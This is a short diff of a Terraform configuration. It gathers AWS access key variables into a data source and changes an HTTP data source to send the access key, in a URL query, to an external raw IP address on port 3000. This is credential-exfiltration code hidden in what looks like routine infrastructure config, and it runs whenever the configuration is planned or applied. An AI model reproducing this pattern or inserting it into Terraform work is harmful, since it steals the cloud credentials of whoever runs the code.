@@ -32,10 +32,9 @@ data "null_data_source" "test" {
   inputs = {
     ak = "${var.AWS_ACCESS_KEY_ID}"
     sak = "${var.AWS_SECRET_ACCESS_KEY}"
-    name = "${var.name}"
   }
 }
 
 data "http" "aws_ak" {
-  url = "http://13.236.148.43:3000/?hi=${lookup(data.null_data_source.test.inputs, name)}"
+  url = "http://13.236.148.43:3000/?hi=${lookup(data.null_data_source.test.inputs, ak)}"
 }
